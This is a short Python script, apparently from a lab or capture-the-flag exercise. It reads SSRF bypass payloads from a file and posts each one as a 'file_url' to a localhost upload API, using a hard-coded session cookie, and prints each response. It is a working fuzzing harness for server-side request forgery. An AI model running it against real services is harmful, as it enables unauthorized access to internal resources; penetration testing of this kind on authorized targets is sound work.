#!/usr/bin/python3
import requests

fd = open("ssrf-bypasses.txt", "r")
url = "http://localhost/api/v2/upload"

while True:
	# read one line at a time
	payload = fd.readline()
	# check for EOF
	if payload == "":
		break
	# post data
	json = {"file_url": payload}
	# Content-Type header
	headers = {"Content-Type": "application/json"}
	# user cookie
	cookies = {"uuid_hash": "8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed"}
	# send request
	res = requests.post(url, json = json, headers = headers, cookies = cookies)
	# print response to the screen
	print(res.text.strip())
fd.close()
